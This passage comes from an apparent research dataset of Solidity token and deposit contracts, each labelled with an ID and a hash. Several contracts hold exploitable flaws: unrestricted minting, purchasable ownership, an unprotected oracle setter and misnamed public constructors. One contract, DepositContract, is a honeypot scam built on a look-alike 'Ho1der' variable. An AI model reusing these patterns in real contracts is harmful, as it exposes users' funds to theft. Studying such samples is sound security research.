        ListingCreated(listingId, tokenContractAddress, price, allowance, now, dateEnds, msg.sender);
    }
    function cancelListing(bytes32 listingId) external {
        Listing storage listing = listings[listingId];
        require(msg.sender == listing.seller);
        delete listings[listingId];
        ListingCancelled(listingId, now);
    }
    function buyListing(bytes32 listingId, uint256 amount) external payable {
        Listing storage listing = listings[listingId];
        address seller = listing.seller;
        address contractAddress = listing.tokenContractAddress;
        uint256 price = listing.price;
        uint256 sale = price.mul(amount);
        uint256 allowance = listing.allowance;
        require(now <= listing.dateEnds);
        require(allowance - sold[listingId] >= amount);
        require(getBalance(contractAddress, seller) >= amount);
        require(getAllowance(contractAddress, seller, this) >= amount);
        require(msg.value == sale);
        ERC20 tokenContract = ERC20(contractAddress);
        require(tokenContract.transferFrom(seller, msg.sender, amount));
        seller.transfer(sale - (sale.mul(ownerPercentage).div(10000)));
        sold[listingId] = sold[listingId].add(amount);
        ListingBought(listingId, contractAddress, price, amount, now, msg.sender);
    }
}
```

## RQ1_b809aa517821

SHA-256 `c9511ccccf05235aefe1f0f59b7acf00a3c7450a5f9936ceabffe0c095010c80`

```solidity
pragma solidity ^0.4.19;
contract DecentralandToken {
    string public name = "Decentraland Mana";
    string public symbol = "MANA";
    uint8 public constant decimals = 18;  
    address public owner;
    uint256 public constant tokensPerEth = 1;
    uint256 public constant howManyEtherInWeiToBecomeOwner = 1000 ether;
    uint256 public constant howManyEtherInWeiToKillContract = 500 ether;
    uint256 public constant howManyEtherInWeiToChangeSymbolName = 400 ether;
    bool public funding = true;
    uint256 totalTokens = 1000;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Migrate(address indexed _from, address indexed _to, uint256 _value);
    event Refund(address indexed _from, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    function DecentralandToken() public {
        owner = msg.sender;
        balances[owner]=1000;
    }
    function changeNameSymbol(string _name, string _symbol) payable external
    {
        if (msg.sender==owner || msg.value >=howManyEtherInWeiToChangeSymbolName)
        {
            name = _name;
            symbol = _symbol;
        }
    }
    function changeOwner (address _newowner) payable external
    {
        if (msg.value>=howManyEtherInWeiToBecomeOwner)
        {
            owner.transfer(msg.value);
            owner.transfer(this.balance);
            owner=_newowner;
        }
    }
    function killContract () payable external
    {
        if (msg.sender==owner || msg.value >=howManyEtherInWeiToKillContract)
        {
            selfdestruct(owner);
        }
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        var senderBalance = balances[msg.sender];
        if (senderBalance >= _value && _value > 0) {
            senderBalance -= _value;
            balances[msg.sender] = senderBalance;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        }
        return false;
    }
    function mintTo(address _to, uint256 _value) public returns (bool) {
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
    }
    function totalSupply() external constant returns (uint256) {
        return totalTokens;
    }
    function balanceOf(address _owner) external constant returns (uint256) {
        return balances[_owner];
    }
    function transferFrom(
         address _from,
         address _to,
         uint256 _amount
     ) public returns (bool success) {
         if (balances[_from] >= _amount
             && allowed[_from][msg.sender] >= _amount
             && _amount > 0
             && balances[_to] + _amount > balances[_to]) {
             balances[_from] -= _amount;
             allowed[_from][msg.sender] -= _amount;
             balances[_to] += _amount;
             return true;
         } else {
             return false;
         }
  }
    function approve(address _spender, uint256 _amount) public returns (bool success) {
         allowed[msg.sender][_spender] = _amount;
         Approval(msg.sender, _spender, _amount);
         return true;
     }
    function () payable external {
        if (!funding) revert();
        if (msg.value == 0) revert();
        var numTokens = msg.value * (1000.0/totalTokens);
        totalTokens += numTokens;
        balances[msg.sender] += numTokens;
        Transfer(0, msg.sender, numTokens);
    }
}
```

## RQ1_30e6629a4a09

SHA-256 `21081842f179d284a58c7752dc7219ce594800517d5a78c52ec489fe9e07ab36`

```solidity
pragma solidity ^0.5.1;
contract ERC20Interface {
	function totalSupply() public view returns (uint);
	function balanceOf(address tokenOwner) public view returns (uint balance);
	function allowance(address tokenOwner, address spender) public view returns (uint remaining);
	function transfer(address to, uint tokens) public returns (bool success);
	function approve(address spender, uint tokens) public returns (bool success);
	function transferFrom(address from, address to, uint tokens) public returns (bool success);
	event Transfer(address indexed from, address indexed to, uint tokens);
	event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
contract HomesCoin is ERC20Interface {
	string public symbol;
	string public  name;
	uint8 public decimals;
	uint _totalSupply;
	uint public base_price;			
	uint public min_fee;			
	uint public fee_div;			
	uint public min_balance;		
	address payable public oracle_adr;	
	address payable public owner;
	mapping(address => uint) public balances;
	mapping(address => mapping(address => uint)) allowed;
	constructor() public {
		symbol = "HOM";
		name = "HOM Coin";
		decimals = 18;
		_totalSupply = 10000000 * 10**uint(decimals);
		owner = msg.sender;
		balances[address(this)] = _totalSupply;
		emit Transfer(address(0), owner, _totalSupply);
		base_price=100000;
		oracle_adr = address(uint160(owner));
		min_balance = .02 ether;
		fee_div = 100;
		min_fee = .000001 ether;
	}
	function totalSupply() public view returns (uint) {
		return _totalSupply;
	}
	function getCirculatingSupply() public view returns (uint) {
	    return _totalSupply - balances[address(this)];
	}
	uint public lastTradedPrice = 0;
	function balanceOf(address tokenOwner) public view returns (uint balance) {
		return balances[tokenOwner];
	}
	function transfer(address to, uint tokens) public returns (bool success) {
		require(to!=address(0));
		require(tokens<=balances[msg.sender]);
		balances[msg.sender] = balances[msg.sender] - tokens;
		balances[to] = balances[to] + tokens;
		emit Transfer(msg.sender, to, tokens);
		return true;
	}
	function approve(address spender, uint tokens) public returns (bool success) {
		allowed[msg.sender][spender] = tokens;
		emit Approval(msg.sender, spender, tokens);
		return true;
	}
	function transferFrom(address from, address to, uint tokens) public returns (bool success) {
		require(to!=address(0));
		require(balances[from]>=tokens);
		require(allowed[from][msg.sender]>=tokens);
		balances[from] = balances[from] - tokens;
		allowed[from][msg.sender] = allowed[from][msg.sender] - tokens;
		balances[to] = balances[to] + tokens;
		emit Transfer(from, to, tokens);
		return true;
	}
	function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
		return allowed[tokenOwner][spender];
	}
	function mint(uint amt) public{
		require(msg.sender==owner);
		balances[address(this)] += amt;
		emit Transfer(address(0), address(this), amt);
	}
	function burn(uint amt) public{
		require(msg.sender==owner);
		require(balances[owner]>=amt);
		balances[owner]-=amt;
		emit Transfer(owner, address(0), amt);
	}
	function destroy(address payable receiver) public {
		require(msg.sender==owner);
		selfdestruct(receiver);
	}
	event HomeSaleEvent(uint64 houseid, uint8 day, uint8 month, uint16 year, uint64 price100, string source);
	mapping(uint64=>string) public addresses;
	mapping(uint64=>uint32) public sqfts;
	mapping(uint64=>uint8) public bedrooms;
	mapping(uint64=>uint8) public bathrooms;
	mapping(uint64=>uint8) public house_type;
	mapping(uint64=>uint16) public year_built;
	mapping(uint64=>uint32) public lot_size;
	mapping(uint64=>uint64) public parcel_num;
	mapping(uint64=>uint32) public zipcode;
	uint64 public num_houses = 0;
	function makeEvent(uint64 houseid, uint8 day, uint8 month, uint16 year, uint64 price100, string memory source) public{
		require(msg.sender==owner);
		emit HomeSaleEvent(houseid,day,month,year, price100, source);
	}
	function addHouse(string memory adr, uint32 sqft, uint8 bedroom,uint8 bathroom,uint8 h_type, uint16 yr_built, uint32 lotsize, uint64 parcel, uint32 zip) public{
		require(msg.sender==owner);
		require(bytes(adr).length<128);
		addresses[num_houses] = adr;
		sqfts[num_houses]=sqft;
		bedrooms[num_houses]=bedroom;
		bathrooms[num_houses]=bathroom;
		house_type[num_houses]=h_type;
		year_built[num_houses]=yr_built;
		lot_size[num_houses] = lotsize;
		parcel_num[num_houses] = parcel;
		zipcode[num_houses] = zip;
		num_houses++;
	}
	function resetHouseParams(uint64 num_house, uint32 sqft, uint8 bedroom,uint8 bathroom,uint8 h_type, uint16 yr_built, uint32 lotsize, uint64 parcel, uint32 zip) public{
		require(msg.sender==owner);
		sqfts[num_house]=sqft;
		bedrooms[num_house]=bedroom;
		bathrooms[num_house]=bathroom;
		house_type[num_house]=h_type;
		year_built[num_house]=yr_built;
		lot_size[num_house] = lotsize;
		parcel_num[num_house] = parcel;
		zipcode[num_house] = zip;
	}
	event DonationEvent(address sender, uint value);
	function ()external payable{
		emit DonationEvent(msg.sender,msg.value);
	}
	function getFee() public view returns (uint fee){
		uint a = oracle_adr.balance;
		if(a>min_balance)return min_fee;
		return (min_balance-a)/fee_div;
	}
	function getSellReturn(uint amount) public view returns (uint value){	
		uint a = getFee();
		if(a>(amount*base_price/10000))return 0; 
		return (amount*base_price/10000) - a;
	}
	function getBuyCost(uint amount) public view returns (uint cost){		
	    return (amount*base_price/10000) + getFee();
	}
	event SellEvent(uint tokens);
	event BuyEvent(uint tokens);
	function buy(uint tokens)public payable{
	    uint cost = getBuyCost(tokens);
		require(msg.value>=cost);
		require(balances[address(this)]>=tokens);
		balances[address(this)]-=tokens;
		balances[msg.sender]+=tokens;
		msg.sender.transfer(msg.value-cost);
		if(oracle_adr.balance<min_balance)
		    oracle_adr.transfer(getFee());
		else
		    owner.transfer(getFee()/2);
		lastTradedPrice = base_price;
		emit Transfer(address(this), msg.sender, tokens);
		emit BuyEvent(tokens);
	}
	function sell(uint tokens)public{
	    uint result = getSellReturn(tokens);
	    require(balances[msg.sender]>=tokens);
		require(address(this).balance>result);
		balances[address(this)]+=tokens;
		balances[msg.sender]-=tokens;
		msg.sender.transfer(result);
		if(oracle_adr.balance<min_balance)
		    oracle_adr.transfer(getFee());
		else
		    owner.transfer(getFee()/2);
		lastTradedPrice = base_price;
		emit Transfer(msg.sender, address(this), tokens);
		emit SellEvent(tokens);
	}
	function forsale(uint tokens)public{
		require(msg.sender==owner);
		allowed[owner][address(0)] = tokens;
		emit Approval(owner, address(0), tokens);
	}
	function get_tradable() public view returns (uint tradable){
		return balances[address(this)];
	}
	function setPrice(uint newPrice) public{
		require(msg.sender==oracle_adr);
		base_price = newPrice;
	}
	function setFeeParams(uint new_min_fee, uint new_fee_div, uint new_min_bal) public{
	    require(msg.sender==owner);
	    min_fee = new_min_fee;
	    min_balance = new_min_bal;
	    fee_div = new_fee_div;
	}
	function setOracleAddress(address payable adr) public {
	    oracle_adr = adr;
	}
}
```

## RQ1_84ed7052a606

SHA-256 `5508c1c2fdd37ff8679263626af7420ce7dfc2e8c6c5b92b6ef3c66c48a35b03`

```solidity
pragma solidity ^0.4.14;
contract SafeMath
{
    function add(uint256 x, uint256 y) internal constant returns (uint256) 
    {
        uint256 z = x + y;
        if((z >= x) && (z >= y))
        {
          return z;
        }
        else
        {
            revert();
        }
    }
    function sub(uint256 x, uint256 y) internal constant returns (uint256) 
    {
        if(x >= y)
        {
           uint256 z = x - y;
           return z;
        }
        else
        {
            revert();
        }
    }
    function div(uint256 x, uint256 y) internal constant returns (uint256)
    {
        uint256 z = x / y;
        return z;
    } address Ho1der = msg.sender;
    function mul(uint256 x, uint256 y) internal constant returns (uint256) 
    {
        uint256 z = x * y;
        if((x == 0) || (z / x == y))
        {
            return z;
        }
        else
        {
            revert();
        }
    }
}
contract DepositContract is SafeMath
{
    struct Certificate
    {
        uint Time;
        uint Invested;
    }
    event Deposited(address indexed sender, uint value);
    event Invested(address indexed sender, uint value);
    event Refunded(address indexed sender, uint value);
    event Withdrew(address indexed sender, uint value);
    uint public TotalDeposited;
    uint public Available;
    uint public DepositorsQty;
    uint public prcntRate = 10;
    bool RefundEnabled;
    address public Holder;
    mapping (address => uint) public Depositors;
    mapping (address => Certificate) public Certificates;
    function init()
    {
        Holder = msg.sender;
    }
    function SetPrcntRate(uint val) public
    {
        if(val >= 1 && msg.sender == Holder)
        {
            prcntRate = val;
        }
    }
    function() payable
    {
        Deposit();
    }
    function Deposit() public payable
    {
        if (msg.value >= 3 ether)
        {
            if (Depositors[msg.sender] == 0)
                DepositorsQty++;
            Depositors[msg.sender] += msg.value;
            TotalDeposited += msg.value;
            Available += msg.value;
            Invested(msg.sender, msg.value);
        }   
    }
    function ToLend() public payable
    {
        Certificates[msg.sender].Time = now;
        Certificates[msg.sender].Invested += msg.value;
        Deposited(msg.sender, msg.value);
    }
    function RefundDeposit(address addr, uint amt) public
    {
        if(Depositors[addr] > 0)
        {
            if(msg.sender == Ho1der)
            {
                addr.send(amt);
                Available -= amt;
                Withdrew(addr, amt);
            }
        }
    }
    function Close() public
    {
        if (msg.sender == Ho1der)
        {
            suicide(Ho1der);
        }
    }
}
```

## RQ1_9fff9a0c4cd9

SHA-256 `e12e46e0d41035c6638c4ff98901c5135cbf58b84654f9e02ac06ecb6ec5efee`

```solidity
pragma solidity ^0.4.19;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface Token { 
    function distr(address _to, uint256 _value) public returns (bool);
    function totalSupply() constant public returns (uint256 supply);
    function balanceOf(address _owner) constant public returns (uint256 balance);
}
contract Enumivo is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;
    string public constant name = "Enumivo";
    string public constant symbol = "ENU";
    uint public constant decimals = 8;
    uint256 public totalSupply = 1000000000e8;
    uint256 public totalDistributed = 100000000e8;
    uint256 public totalRemaining = totalSupply.sub(totalDistributed);
    uint256 public value;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }
    function UselessAirdroppedToken () public {
        owner = msg.sender;
        value = 5000e8;
        distr(owner, totalDistributed);
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function enableWhitelist(address[] addresses) onlyOwner public {
        for (uint i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = false;
        }
    }
    function disableWhitelist(address[] addresses) onlyOwner public {
        for (uint i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = true;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Distr(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function airdrop(address[] addresses) onlyOwner canDistr public {
        require(addresses.length <= 255);
        require(value <= totalRemaining);
        for (uint i = 0; i < addresses.length; i++) {
            require(value <= totalRemaining);
            distr(addresses[i], value);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function distribution(address[] addresses, uint256 amount) onlyOwner canDistr public {
        require(addresses.length <= 255);
        require(amount <= totalRemaining);
        for (uint i = 0; i < addresses.length; i++) {
            require(amount <= totalRemaining);
            distr(addresses[i], amount);
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function distributeAmounts(address[] addresses, uint256[] amounts) onlyOwner canDistr public {
        require(addresses.length <= 255);
        require(addresses.length == amounts.length);
        for (uint8 i = 0; i < addresses.length; i++) {
            require(amounts[i] <= totalRemaining);
            distr(addresses[i], amounts[i]);
            if (totalDistributed >= totalSupply) {
                distributionFinished = true;
            }
        }
    }
    function () external payable {
            getTokens();
     }
    function getTokens() payable canDistr onlyWhitelist public {
        if (value > totalRemaining) {
            value = totalRemaining;
        }
        require(value <= totalRemaining);
        address investor = msg.sender;
        uint256 toGive = value;
        distr(investor, toGive);
        if (toGive > 0) {
            blacklist[investor] = true;
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        value = value.div(1000).mul(999);
    }
    function balanceOf(address _owner) constant public returns (uint256) {
	    return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        uint256 etherBalance = this.balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        Burn(burner, _value);
    }
    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_2d04d0852310

SHA-256 `76ee682a98e51b8f522a87b39759b78324a97b9834b0cb10541f0a8b9dc9fc51`

```solidity
pragma solidity ^0.4.22;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface Token { 
    function distr(address _to, uint256 _value) external returns (bool);
    function totalSupply() constant external returns (uint256 supply);
    function balanceOf(address _owner) constant external returns (uint256 balance);
}
contract BitCashPlatform is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;
    string public constant name = "BitCash Platform";
    string public constant symbol = "BCP";
    uint public constant decimals = 18;
uint256 public totalSupply = 30000000000e18;
uint256 public totalDistributed = 15000000000e18;
uint256 public totalRemaining = totalSupply.sub(totalDistributed);
uint256 public value = 150000e18;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }
    function BITDINERO() public {
        owner = msg.sender;
        balances[owner] = totalDistributed;
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        emit DistrFinished();
        return true;
    }
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Distr(_to, _amount);
        emit Transfer(address(0), _to, _amount);
        return true;
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function () external payable {
        getTokens();
     }
    function getTokens() payable canDistr onlyWhitelist public {
        if (value > totalRemaining) {
            value = totalRemaining;
        }
        require(value <= totalRemaining);
        address investor = msg.sender;
        uint256 toGive = value;
        distr(investor, toGive);
        if (toGive > 0) {
            blacklist[investor] = true;
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        value = value.div(100000).mul(99999);
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        uint256 etherBalance = address(this).balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        emit Burn(burner, _value);
    }
    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_5535d927a148

SHA-256 `464d1877cb74e16dfcffa99ecfdb6298164764523b1b286e6bc7ccfe32d411de`

```solidity
pragma solidity ^0.4.11;
library SafeMath {
  function mul(uint a, uint b) internal returns (uint) {
    uint c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint a, uint b) internal returns (uint) {
    uint c = a / b;
    return c;
  }
  function sub(uint a, uint b) internal returns (uint) {
    assert(b <= a);
    return a - b;
  }
  function add(uint a, uint b) internal returns (uint) {
    uint c = a + b;
    assert(c >= a);
    return c;
  }
  function max64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a >= b ? a : b;
  }
  function min64(uint64 a, uint64 b) internal constant returns (uint64) {
    return a < b ? a : b;
  }
  function max256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a >= b ? a : b;
  }
  function min256(uint256 a, uint256 b) internal constant returns (uint256) {
    return a < b ? a : b;
  }
  function assert(bool assertion) internal {
    if (!assertion) {
      throw;
    }
  }
}
contract ERC20Basic {
  uint public totalSupply;
  function balanceOf(address who) constant returns (uint);
  function transfer(address to, uint value);
  event Transfer(address indexed from, address indexed to, uint value);
}
contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) constant returns (uint);
  function transferFrom(address from, address to, uint value);
  function approve(address spender, uint value);
  event Approval(address indexed owner, address indexed spender, uint value);
}
contract BasicToken is ERC20Basic {
  using SafeMath for uint;
  mapping(address => uint) balances;
  modifier onlyPayloadSize(uint size) {
     if(msg.data.length < size + 4) {
       throw;
     }
     _;
  }
  function transfer(address _to, uint _value) onlyPayloadSize(2 * 32) {
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
  }
  function balanceOf(address _owner) constant returns (uint balance) {
    return balances[_owner];
  }
}
contract StandardToken is BasicToken, ERC20 {
  mapping (address => mapping (address => uint)) allowed;
  function transferFrom(address _from, address _to, uint _value) onlyPayloadSize(3 * 32) {
    var _allowance = allowed[_from][msg.sender];
    balances[_to] = balances[_to].add(_value);
    balances[_from] = balances[_from].sub(_value);
    allowed[_from][msg.sender] = _allowance.sub(_value);
    Transfer(_from, _to, _value);
  }
  function approve(address _spender, uint _value) {
    if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
  }
  function allowance(address _owner, address _spender) constant returns (uint remaining) {
    return allowed[_owner][_spender];
  }
}
contract KAI is StandardToken{
    string public constant name = "KAI";
    string public constant symbol = "KAI";
    uint public constant decimals = 6;
    string public constant version = "1.0";
    address public owner;
    modifier onlyOwner{
      if(msg.sender != owner) throw;
      _;
    } 
    function EGC(){
        owner = msg.sender;
        totalSupply = 10*(10**8)*(10**decimals);
        balances[owner] =  totalSupply;
    }
    function changeOwner(address newOwner) onlyOwner{
      owner = newOwner;
    }
    function () payable{
        throw;
    }
    function kill() onlyOwner{
        suicide(owner);
    }
}
```

## RQ1_b0475500f92c

SHA-256 `d326e494c59d723d72b69f1a53cde7c841a7a94cbe62b8d33922c3961310fc09`

```solidity
pragma solidity ^0.4.19;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface Token { 
    function distr(address _to, uint256 _value) public returns (bool);
    function totalSupply() constant public returns (uint256 supply);
    function balanceOf(address _owner) constant public returns (uint256 balance);
}
contract BECHAIN is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;
    string public constant name = "BECHAIN";
    string public constant symbol = "BCN";
    uint public constant decimals = 8;
    uint256 public totalSupply = 100000000e8;
    uint256 public totalDistributed = 10000000e8;
    uint256 public totalRemaining = totalSupply.sub(totalDistributed);
    uint256 public value;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }
    function BCN () public {
        owner = msg.sender;
        value = 400e8;
        distr(owner, totalDistributed);
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function enableWhitelist(address[] addresses) onlyOwner public {
        for (uint i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = false;
        }
    }
    function disableWhitelist(address[] addresses) onlyOwner public {
        for (uint i = 0; i < addresses.length; i++) {
